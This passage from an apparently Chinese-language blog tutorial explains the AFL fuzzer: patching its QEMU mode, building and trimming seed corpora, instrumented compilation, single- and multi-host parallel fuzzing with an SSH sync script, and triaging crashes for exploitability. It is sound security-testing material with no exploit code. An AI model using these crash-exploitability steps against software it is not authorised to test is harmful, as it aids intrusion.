https://lkml.org/lkml/2019/6/3/988</span></span><br><span class="line"> #include &lt;sched.h&gt;</span><br><span class="line"> #include &lt;sys/timex.h&gt;</span><br><span class="line"> #ifdef __ia64__</span><br><span class="line"><span class="meta">@@ -116,6 +117,8 @@</span> int __clone2(int (*fn)(void *), void *ch</span><br><span class="line"> #include &quot;qemu.h&quot;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+extern unsigned int afl_forksrv_pid;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> #ifndef CLONE_IO</span><br><span class="line"> #define CLONE_IO                0x80000000      /* Clone io context */</span><br><span class="line"> #endif</span><br><span class="line"> </span><br><span class="line"><span class="meta">@@ -256,7 +259,9 @@</span> static type name (type1 arg1,type2 arg2,</span><br><span class="line"> #endif</span><br><span class="line"> </span><br><span class="line"> #ifdef __NR_gettid</span><br><span class="line"><span class="deletion">-_syscall0(int, gettid)</span></span><br><span class="line"><span class="addition">+// taken from https://patchwork.kernel.org/patch/10862231/</span></span><br><span class="line"><span class="addition">+#define __NR_sys_gettid __NR_gettid</span></span><br><span class="line"><span class="addition">+_syscall0(int, sys_gettid)</span></span><br><span class="line"> #else</span><br><span class="line"> /* This is a replacement for the host gettid() and must return a host</span><br><span class="line">    errno. */</span><br><span class="line"><span class="meta">@@ -6219,7 +6224,8 @@</span> static void *clone_func(void *arg)</span><br><span class="line">     cpu = ENV_GET_CPU(env);</span><br><span class="line">     thread_cpu = cpu;</span><br><span class="line">     ts = (TaskState *)cpu-&gt;opaque;</span><br><span class="line"><span class="deletion">-    info-&gt;tid = gettid();</span></span><br><span class="line"><span class="addition">+    // taken from https://patchwork.kernel.org/patch/10862231/</span></span><br><span class="line"><span class="addition">+    info-&gt;tid = sys_gettid();</span></span><br><span class="line">     task_settid(ts);</span><br><span class="line">     if (info-&gt;child_tidptr)</span><br><span class="line">         put_user_u32(info-&gt;tid, info-&gt;child_tidptr);</span><br><span class="line"><span class="meta">@@ -6363,9 +6369,11 @@</span> static int do_fork(CPUArchState *env, un</span><br><span class="line">                mapping.  We can&#x27;t repeat the spinlock hack used above because</span><br><span class="line">                the child process gets its own copy of the lock.  */</span><br><span class="line">             if (flags &amp; CLONE_CHILD_SETTID)</span><br><span class="line"><span class="deletion">-                put_user_u32(gettid(), child_tidptr);</span></span><br><span class="line"><span class="addition">+                // taken from https://patchwork.kernel.org/patch/10862231/</span></span><br><span class="line"><span class="addition">+                put_user_u32(sys_gettid(), child_tidptr);</span></span><br><span class="line">             if (flags &amp; CLONE_PARENT_SETTID)</span><br><span class="line"><span class="deletion">-                put_user_u32(gettid(), parent_tidptr);</span></span><br><span class="line"><span class="addition">+                // taken from https://patchwork.kernel.org/patch/10862231/</span></span><br><span class="line"><span class="addition">+                put_user_u32(sys_gettid(), parent_tidptr);</span></span><br><span class="line">             ts = (TaskState *)cpu-&gt;opaque;</span><br><span class="line">             if (flags &amp; CLONE_SETTLS)</span><br><span class="line">                 cpu_set_tls (env, newtls);</span><br><span class="line"><span class="meta">@@ -11402,7 +11410,8 @@</span> abi_long do_syscall(void *cpu_env, int n</span><br><span class="line">         break;</span><br><span class="line"> #endif</span><br><span class="line">     case TARGET_NR_gettid:</span><br><span class="line"><span class="deletion">-        ret = get_errno(gettid());</span></span><br><span class="line"><span class="addition">+        // taken from https://patchwork.kernel.org/patch/10862231/</span></span><br><span class="line"><span class="addition">+        ret = get_errno(sys_gettid());</span></span><br><span class="line">         break;</span><br><span class="line"> #ifdef TARGET_NR_readahead</span><br><span class="line">     case TARGET_NR_readahead:</span><br></pre></td></tr></table></figure><p>执行<code>./build_qemu_support.sh</code></p><p>如果要安装其他架构,需要在执行构建之前声明变量</p><p><code>export CPU_TARGET=arm</code></p><h2 id="构建语料库"><a href="#构建语料库" class="headerlink" title="构建语料库"></a>构建语料库</h2><p>AFL需要一些初始输入数据（也叫种子文件）作为Fuzzing的起点，这些输入甚至可以是毫无意义的数据，AFL可以通过启发式算法<u>自动确定文件格式结构</u></p><p>如果要获得更快的Fuzzing速度，那么就有必要生成一个高质量的语料库，这一节就解决如何选择输入文件、从哪里寻找这些文件、如何精简找到的文件三个问题。</p><h3 id="选择"><a href="#选择" class="headerlink" title="选择"></a>选择</h3><p><strong>(1) 有效的输入</strong></p><p>尽管有时候无效输入会产生bug和崩溃，但有效输入可以更快的找到更多执行路径。</p><p><strong>(2) 尽量小的体积</strong></p><p>较小的文件会不仅可以减少测试和处理的时间，也能节约更多的内存，AFL给出的建议是最好小于1 KB，但其实可以根据自己测试的程序权衡，这在AFL文档的<code>perf_tips.txt</code>中有具体说明。</p><h3 id="寻找"><a href="#寻找" class="headerlink" title="寻找"></a>寻找</h3><ol><li>使用项目自身提供的测试用例</li><li>目标程序bug提交页面</li><li>使用格式转换器，用从现有的文件格式生成一些不容易找到的文件格式：</li><li>afl源码的testcases目录下提供了一些测试用例</li><li>其他开源的语料库</li><li><a href="http://lcamtuf.coredump.cx/afl/demo/">afl generated image test sets</a></li><li><a href="https://github.com/google/fuzzer-test-suite">fuzzer-test-suite</a></li><li><a href="https://samples.libav.org/">libav samples</a></li><li><a href="http://samples.ffmpeg.org/">ffmpeg samples</a></li><li><a href="https://github.com/MozillaSecurity/fuzzdata">fuzzdata</a></li><li><a href="https://gitlab.anu.edu.au/lunar/moonshine">moonshine</a></li></ol><h3 id="修剪"><a href="#修剪" class="headerlink" title="修剪"></a>修剪</h3><p>网上找到的一些大型语料库中往往包含大量的文件，这时就需要对其精简，这个工作有个术语叫做——语料库蒸馏（Corpus Distillation）。AFL提供了两个工具来帮助我们完成这部工作——<code>afl-cmin</code>和<code>afl-tmin</code>。</p><p><strong>移除执行相同代码的输入文件——afl-cmin</strong></p><p><code>afl-cmin</code>的核心思想是：<strong>尝试找到与语料库全集具有相同覆盖范围的最小子集</strong>。举个例子：假设有多个文件，都覆盖了相同的代码，那么就丢掉多余的文件。其使用方法如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ afl-cmin -i input_dir -o output_dir -- /path/to/tested/program [params]</span><br></pre></td></tr></table></figure><p>更多的时候，我们需要从文件中获取输入，这时可以使用“@@”代替被测试程序命令行中输入文件名的位置。Fuzzer会将其替换为实际执行的文件：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ afl-cmin -i input_dir -o output_dir -- /path/to/tested/program [params] @@</span><br></pre></td></tr></table></figure><p><strong>减小单个输入文件的大小——afl-tmin</strong></p><p>整体的大小得到了改善，接下来还要对每个文件进行更细化的处理</p><p><code>afl-tmin</code>有两种工作模式，<code>instrumented mode</code>和<code>crash mode</code>。默认的工作方式是<code>instrumented mode</code>，如下所示：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ afl-tmin -i input_file -o output_file -- /path/to/tested/program [params] @@</span><br></pre></td></tr></table></figure><p>如果指定了参数<code>-x</code>，即<code>crash mode</code>，会把导致程序非正常退出的文件直接剔除。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ afl-tmin -x -i input_file -o output_file -- /path/to/tested/program [params] @@</span><br></pre></td></tr></table></figure><p><code>afl-tmin</code>接受单个文件输入，所以可以用一条简单的shell脚本批量处理。如果语料库中文件数量特别多，且体积特别大的情况下，这个过程可能花费几天甚至更长的时间！</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> *; <span class="keyword">do</span> afl-tmin -i <span class="variable">$i</span> -o tmin-<span class="variable">$i</span> -- ~/path/to/tested/program [params] @@; <span class="keyword">done</span>;</span><br></pre></td></tr></table></figure><h2 id="构建被测试程序"><a href="#构建被测试程序" class="headerlink" title="构建被测试程序"></a>构建被测试程序</h2><p>AFL从源码编译程序时进行插桩，以记录代码覆盖率。这个工作需要使用其提供的两种编译器的wrapper编译目标程序</p><h3 id="afl-gcc模式"><a href="#afl-gcc模式" class="headerlink" title="afl-gcc模式"></a>afl-gcc模式</h3><p><code>afl-gcc</code>/<code>afl-g++</code>作为<code>gcc</code>/<code>g++</code>的wrapper，它们的用法完全一样，前者会将接收到的参数传递给后者，我们编译程序时只需要将编译器设置为<code>afl-gcc</code>/<code>afl-g++</code>就行，如下面演示的那样。如果程序不是用autoconf构建，直接修改<code>Makefile</code>文件中的编译器为<code>afl-gcc/g++</code>也行。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./configure CC=<span class="string">&quot;afl-gcc&quot;</span> CXX=<span class="string">&quot;afl-g++&quot;</span></span><br></pre></td></tr></table></figure><p>在Fuzzing共享库时，可能需要编写一个简单demo，将输入传递给要Fuzzing的库（其实大多数项目中都自带了类似的demo）。这种情况下，可以通过设置<code>LD_LIBRARY_PATH</code>让程序加载经过AFL插桩的.so文件，不过最简单的方法是静态构建，通过以下方式实现：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./configure --disable-shared CC=<span class="string">&quot;afl-gcc&quot;</span> CXX=<span class="string">&quot;afl-g++&quot;</span></span><br></pre></td></tr></table></figure><h3 id="LLVM模式"><a href="#LLVM模式" class="headerlink" title="LLVM模式"></a>LLVM模式</h3><p>LLVM Mode模式编译程序可以获得更快的Fuzzing速度，进入<code>llvm_mode</code>目录进行编译，之后使用<code>afl-clang-fast</code>构建序程序即可，如下所示：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> llvm_mode</span><br><span class="line">$ apt-get install clang</span><br><span class="line">$ <span class="built_in">export</span> LLVM_CONFIG=`<span class="built_in">which</span> llvm-config` &amp;&amp; make &amp;&amp; <span class="built_in">cd</span> ..$ ./configure --disable-shared CC=<span class="string">&quot;afl-clang-fast&quot;</span> CXX=<span class="string">&quot;afl-clang-fast++&quot;</span></span><br></pre></td></tr></table></figure><h2 id="开始Fuzz测试插桩程序"><a href="#开始Fuzz测试插桩程序" class="headerlink" title="开始Fuzz测试插桩程序"></a>开始Fuzz<strong>测试插桩程序</strong></h2><h3 id="白盒测试"><a href="#白盒测试" class="headerlink" title="白盒测试"></a>白盒测试</h3><p>编译好程序后，可以选择使用<code>afl-showmap</code>跟踪单个输入的执行路径，并打印程序执行的输出、捕获的元组（tuples），tuple用于获取分支信息，从而衡量衡量程序覆盖情况，下一篇文章中会详细的解释，这里可以先不用管。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ afl-showmap -m none -o /dev/null -- ./build/bin/imagew 23.bmp out.png</span><br><span class="line"></span><br><span class="line">[*] Executing <span class="string">&#x27;./build/bin/imagew&#x27;</span>...-- Program output begins --23.bmp -&gt; out.pngProcessing: 13x32-- Program output ends --[+] Captured 1012 tuples <span class="keyword">in</span> <span class="string">&#x27;/dev/null&#x27;</span>.</span><br></pre></td></tr></table></figure><p>使用不同的输入，正常情况下<code>afl-showmap</code>会捕获到不同的tuples，这就说明我们的的插桩是有效的，还有前面提到的<code>afl-cmin</code>就是通过这个工具来去掉重复的输入文件。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ $ afl-showmap -m none -o /dev/null -- ./build/bin/imagew 111.pgm out.png</span><br><span class="line"></span><br><span class="line">[*] Executing <span class="string">&#x27;./build/bin/imagew&#x27;</span>...-- Program output begins --111.pgm -&gt; out.pngProcessing: 7x7-- Program output ends --[+] Captured 970 tuples <span class="keyword">in</span> <span class="string">&#x27;/dev/null&#x27;</span>.</span><br></pre></td></tr></table></figure><p><strong>执行fuzzer</strong></p><p>在执行<code>afl-fuzz</code>前，如果系统配置为将核心转储文件（core）通知发送到外部程序。 将导致将崩溃信息发送到Fuzzer之间的延迟增大，进而可能将崩溃被误报为超时，所以我们得临时修改<code>core_pattern</code>文件，如下所示：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> core &gt;/proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure><p>之后就可以执行<code>afl-fuzz</code>了，通常的格式是：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ afl-fuzz -i testcase_dir -o findings_dir /path/to/program [params]</span><br></pre></td></tr></table></figure><p>或者使用“@@”替换输入文件，Fuzzer会将其替换为实际执行的文件：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ afl-fuzz -i testcase_dir -o findings_dir /path/to/program @@</span><br></pre></td></tr></table></figure><p>如果没有什么错误，Fuzzer就正式开始工作了。首先，对输入队列中的文件进行预处理；然后给出对使用的语料库可警告信息，且输入文件过多；最后，开始Fuzz主循环，显示状态窗口。</p><p><strong>使用screen</strong></p><p>一次Fuzzing过程通常会持续很长时间，如果这期间运行afl-fuzz实例的终端终端被意外关闭了，那么Fuzzing也会被中断。而通过在<code>screen session</code>中启动每个实例，可以方便的连接和断开。关于screen的用法这里就不再多讲，大家可以自行查询。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ screen afl-fuzz -i testcase_dir -o findings_dir /path/to/program @@</span><br></pre></td></tr></table></figure><p>也可以为每个session命名，方便重新连接。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ screen -S fuzzer1$ afl-fuzz -i testcase_dir -o findings_dir /path/to/program [params] @@[detached from 6999.fuzzer1]</span><br><span class="line">$ screen -r fuzzer1  ...</span><br></pre></td></tr></table></figure><h3 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h3><p>所谓黑盒测试，通俗地讲就是对没有源代码的程序进行测试，这时就要用到AFL的QEMU模式了。启用方式和LLVM模式类似，也要先编译。但注意，因为AFL使用的QEMU版本太旧，<code>util/memfd.c</code>中定义的函数<code>memfd_create()</code>会和glibc中的同名函数冲突，在<a href="https://www.mail-archive.com/debian-bugs-dist@lists.debian.org/msg1643066.html">这里</a>可以找到针对QEMU的patch，之后运行脚本<code>build_qemu_support.sh</code>就可以自动下载编译。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apt-get install libini-config-dev libtool-bin automake bison libglib2.0-dev -y$ <span class="built_in">cd</span> qemu_mode$ build_qemu_support.sh$ <span class="built_in">cd</span> .. &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>现在起，只需添加<code>-Q</code>选项即可使用QEMU模式进行Fuzzing。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ afl-fuzz -Q -i testcase_dir -o findings_dir /path/to/program [params] @@</span><br></pre></td></tr></table></figure><h3 id="并行测试"><a href="#并行测试" class="headerlink" title="并行测试"></a>并行测试</h3><h4 id="单系统并行测试"><a href="#单系统并行测试" class="headerlink" title="单系统并行测试"></a><strong>单系统并行测试</strong></h4><p>如果你有一台多核心的机器，可以将一个<code>afl-fuzz</code>实例绑定到一个对应的核心上，也就是说，机器上有几个核心就可以运行多少<code>afl-fuzz</code> 实例：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /proc/cpuinfo| grep <span class="string">&quot;cpu cores&quot;</span>| <span class="built_in">uniq</span></span><br></pre></td></tr></table></figure><p><code>afl-fuzz</code>并行Fuzzing，一般的做法是通过<code>-M</code>参数指定一个主Fuzzer(<code>Master Fuzzer</code>)、通过<code>-S</code>参数指定多个从Fuzzer(<code>Slave Fuzzer</code>)。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ screen afl-fuzz -i testcases/ -o sync_dir/ -M fuzzer1 -- ./program</span><br><span class="line">$ screen afl-fuzz -i testcases/ -o sync_dir/ -S fuzzer2 -- ./program</span><br><span class="line">$ screen afl-fuzz -i testcases/ -o sync_dir/ -S fuzzer3 -- ./program </span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>这两种类型的Fuzzer执行不同的Fuzzing策略，前者进行确定性测试（deterministic ），即对输入文件进行一些特殊而非随机的的变异；后者进行完全随机的变异。</p><p>可以看到这里的<code>-o</code>指定的是一个同步目录，并行测试中，所有的Fuzzer将相互协作，在找到新的代码路径时，相互传递新的测试用例，如下图中以Fuzzer0的角度来看，它查看其它fuzzer的语料库，并通过比较id来同步感兴趣的测试用例。</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-05-12_204215.png" alt=""></p><p><code>afl-whatsup</code>工具可以查看每个fuzzer的运行状态和总体运行概况，加上<code>-s</code>选项只显示概况，其中的数据都是所有fuzzer的总和。</p><p><code>afl-gotcpu</code>工具可以查看每个核心使用状态。</p><h4 id="多系统并行测试"><a href="#多系统并行测试" class="headerlink" title="多系统并行测试"></a><strong>多系统并行测试</strong></h4><p>多系统并行的基本工作原理类似于单系统并行中描述的机制，你需要一个简单的脚本来完成两件事。在本地系统上，压缩每个fuzzer实例目录中<code>queue</code>下的文件，通过SSH分发到其他机器上解压。</p><p>来看一个例子，假设现在有两台机器，基本信息如下：</p><div class="table-container"><table><thead><tr><th style="text-align:center">fuzzer1</th><th style="text-align:center">fuzzerr2</th></tr></thead><tbody><tr><td style="text-align:center">172.21.5.101</td><td style="text-align:center">172.21.5.102</td></tr><tr><td style="text-align:center">运行2个实例</td><td style="text-align:center">运行4个实例</td></tr></tbody></table></div><p>为了能够自动同步数据，需要使用<code>authorized_keys</code>的方式进行身份验证。现要将fuzzer2中每个实例的输入队列同步到fuzzer1中，可以下面的方式：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># 所有要同步的主机</span></span><br><span class="line">FUZZ_HOSTS=<span class="string">&#x27;172.21.5.101 172.21.5.102&#x27;</span></span><br><span class="line"><span class="comment"># SSH 用户</span></span><br><span class="line">FUZZ_USER=root</span><br><span class="line"><span class="comment"># 同步目录</span></span><br><span class="line">SYNC_DIR=<span class="string">&#x27;/root/syncdir&#x27;</span></span><br><span class="line"><span class="comment"># 同步间隔时间</span></span><br><span class="line">SYNC_INTERVAL=$((<span class="number">30</span> * <span class="number">60</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$AFL_ALLOW_TMP</span>&quot;</span> = <span class="string">&quot;&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$PWD</span>&quot;</span> = <span class="string">&quot;/tmp&quot;</span> -o <span class="string">&quot;<span class="variable">$PWD</span>&quot;</span> = <span class="string">&quot;/var/tmp&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;[-] Error: do not use shared /tmp or /var/tmp directories with this script.&quot;</span> 1&gt;&amp;2</span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> -rf .sync_tmp 2&gt;/dev/null</span><br><span class="line"><span class="built_in">mkdir</span> .sync_tmp || <span class="built_in">exit</span> 1</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> :; <span class="keyword">do</span></span><br><span class="line">  <span class="comment"># 打包所有机器上的数据</span></span><br><span class="line">  <span class="keyword">for</span> host <span class="keyword">in</span> <span class="variable">$FUZZ_HOSTS</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;[*] Retrieving data from <span class="variable">$&#123;host&#125;</span>...&quot;</span></span><br><span class="line">    ssh -o <span class="string">&#x27;passwordauthentication no&#x27;</span> <span class="variable">$&#123;FUZZ_USER&#125;</span>@<span class="variable">$&#123;host&#125;</span> \</span><br><span class="line">      <span class="string">&quot;cd &#x27;<span class="variable">$SYNC_DIR</span>&#x27; &amp;&amp; tar -czf - SESSION*&quot;</span> &gt; <span class="string">&quot;.sync_tmp/<span class="variable">$&#123;host&#125;</span>.tgz&quot;</span></span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line">  <span class="comment"># 分发数据</span></span><br><span class="line">  <span class="keyword">for</span> dst_host <span class="keyword">in</span> <span class="variable">$FUZZ_HOSTS</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;[*] Distributing data to <span class="variable">$&#123;dst_host&#125;</span>...&quot;</span></span><br><span class="line">    <span class="keyword">for</span> src_host <span class="keyword">in</span> <span class="variable">$FUZZ_HOSTS</span>; <span class="keyword">do</span></span><br><span class="line">      <span class="built_in">test</span> <span class="string">&quot;<span class="variable">$src_host</span>&quot;</span> = <span class="string">&quot;<span class="variable">$dst_host</span>&quot;</span> &amp;&amp; <span class="built_in">continue</span></span><br><span class="line">      <span class="built_in">echo</span> <span class="string">&quot;    Sending fuzzer data from <span class="variable">$&#123;src_host&#125;</span>...&quot;</span></span><br><span class="line">      ssh -o <span class="string">&#x27;passwordauthentication no&#x27;</span> <span class="variable">$&#123;FUZZ_USER&#125;</span>@<span class="variable">$dst_host</span> \</span><br><span class="line">        <span class="string">&quot;cd &#x27;<span class="variable">$SYNC_DIR</span>&#x27; &amp;&amp; tar -xkzf - &amp;&gt;/dev/null&quot;</span> &lt; <span class="string">&quot;.sync_tmp/<span class="variable">$&#123;src_host&#125;</span>.tgz&quot;</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;[+] Done. Sleeping for <span class="variable">$SYNC_INTERVAL</span> seconds (Ctrl-C to quit).&quot;</span></span><br><span class="line">  <span class="built_in">sleep</span> <span class="variable">$SYNC_INTERVAL</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>成功执行上述shell脚本后，不仅<code>SESSION000</code> <code>SESSION002</code>中的内容更新了，还将<code>SESSION003</code> <code>SESSION004</code>也同步了过来。</p><h2 id="状态窗口"><a href="#状态窗口" class="headerlink" title="状态窗口"></a>状态窗口</h2><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-05-12_163209.png" alt=""></p><p>① Process timing:Fuzzer运行时长、以及距离最近发现的路径、崩溃和挂起经过了多长时间。</p><p>② Overall results：Fuzzer当前状态的概述。其中，总周期数可以用来作为何时停止fuzzing的参考。随着不断地fuzzing，周期数会不断增大，其颜色也会由洋红色，逐步变为黄色、蓝色、绿色，当其变为绿色时代表可执行的内容已经很少了此时便可以通过Ctrl-C，中止当前的fuzzing</p><p>③ Cycle progress：我们输入队列的距离。</p><p>④ Map coverage：目标二进制文件中的插桩代码所观察到覆盖范围的细节。</p><p>⑤ Stage progress：Fuzzer现在正在执行的文件变异策略、执行次数和执行速度。执行速度可以直观地反映当前跑的快不快，如果速度过慢，比如低于500次每秒，那么测试时间会变得非常漫长。如果发生了这种情况，我们需要进一步优化我们的Fuzzing</p><p>⑥ Findings in depth：有关我们找到的执行路径，异常和挂起数量的信息。</p><p>⑦ Fuzzing strategy yields：关于突变策略产生的最新行为和结果的详细信息。</p><p>⑧ Path geometry：有关Fuzzer找到的执行路径的信息。</p><p>⑨ CPU load：CPU利用率<br>更多可以参考官方文档<a href="https://lcamtuf.coredump.cx/afl/status_screen.txt">status_screen (coredump.cx)</a></p><h2 id="crashes处理"><a href="#crashes处理" class="headerlink" title="crashes处理"></a>crashes处理</h2><p><a href="https://mundi-xu.github.io/2021/03/12/Start-Fuzzing-and-crashes-analysis/#crash复现与初步分析">AFL++学习日志（一）开始Fuzz与crashes分析 - Hanyin’s Space (mundi-xu.github.io)</a></p><h3 id="crash-exploration-mode"><a href="#crash-exploration-mode" class="headerlink" title="crash exploration mode"></a>crash exploration mode</h3><p>这是afl-fuzz的一种运行模式，也称为<strong>peruvian rabbit mode</strong>，用于确定bug的可利用性</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -C -i out/default/crashes/ -o crash_exploration/ ./vulnerable</span><br></pre></td></tr></table></figure><p>将一个导致crash测试用例作为afl-fuzz的输入，使用-C选项开启crash exploration模式后，可以快速地产生很多和输入crash相关、但稍有些不同的crashes，从而判断能够控制某块内存地址的长度</p><p>可以参考这篇博客<a href="https://countuponsecurity.com/tag/peruvian-were-rabbit/">peruvian were-rabbit | Count Upon Security</a></p><h3 id="triage-crashes"><a href="#triage-crashes" class="headerlink" title="triage_crashes"></a>triage_crashes</h3><p>AFL源码的experimental目录中有一个名为triage_crashes.sh的脚本，可以帮助我们触发收集到的crashes</p><p>例如</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ~/afl-2.52b/experimental/crash_triage/triage_crashes.sh fuzz_out ~/src/LuPng/a.out @@ out.png 2&gt;&amp;1 | grep SIGNAL</span><br><span class="line">   +++ ID 000000, SIGNAL 11 +++</span><br><span class="line">   +++ ID 000001, SIGNAL 06 +++</span><br><span class="line">   +++ ID 000002, SIGNAL 06 +++</span><br><span class="line">   +++ ID 000003, SIGNAL 06 +++</span><br><span class="line">   +++ ID 000004, SIGNAL 11 +++</span><br><span class="line">   +++ ID 000005, SIGNAL 11 +++</span><br><span class="line">   +++ ID 000006, SIGNAL 11 +++</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure><h3 id="crashwalk"><a href="#crashwalk" class="headerlink" title="crashwalk"></a>crashwalk</h3><p>这个工具基于gdb的exploitable插件，安装也相对简单，在ubuntu上，只需要如下几步即可：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ apt-get install gdb golang</span><br><span class="line">$ <span class="built_in">mkdir</span> tools</span><br><span class="line">$ <span class="built_in">cd</span> tools</span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/jfoote/exploitable.git</span><br><span class="line">$ <span class="built_in">mkdir</span> go</span><br><span class="line">$ <span class="built_in">export</span> GOPATH=~/tools/go</span><br><span class="line">$ <span class="built_in">export</span> CW_EXPLOITABLE=~/tools/exploitable/exploitable/exploitable.py</span><br><span class="line">$ go get -u github.com/bnagy/crashwalk/cmd/...</span><br></pre></td></tr></table></figure><p>crashwalk支持AFL/Manual两种模式。前者通过读取<strong>crashes/README.txt</strong>文件获得目标的执行命令（前面第三节中提到的），后者则可以手动指定一些参数。两种使用方式如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Manual Mode</span></span><br><span class="line">$ ~/tools/go/bin/cwtriage -root syncdir/fuzzer1/crashes/ -match <span class="built_in">id</span> -- ~/parse @@</span><br><span class="line"><span class="comment">#AFL Mode</span></span><br><span class="line">$ ~/tools/go/bin/cwtriage -root syncdir -afl</span><br></pre></td></tr></table></figure><h3 id="afl-collect"><a href="#afl-collect" class="headerlink" title="afl-collect"></a>afl-collect</h3><p>它也是afl-utils套件中的一个工具，同样也是基于exploitable来检查crashes的可利用性。它可以自动删除无效的crash样本、删除重复样本以及自动化样本分类。使用起来命令稍微长一点，如下所示：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ afl-collect -j 8 -d crashes.db -e gdb_script ./afl_sync_dir ./collection_dir --  /path/to/target --target-opts</span><br></pre></td></tr></table></figure><h1 id="实例demo"><a href="#实例demo" class="headerlink" 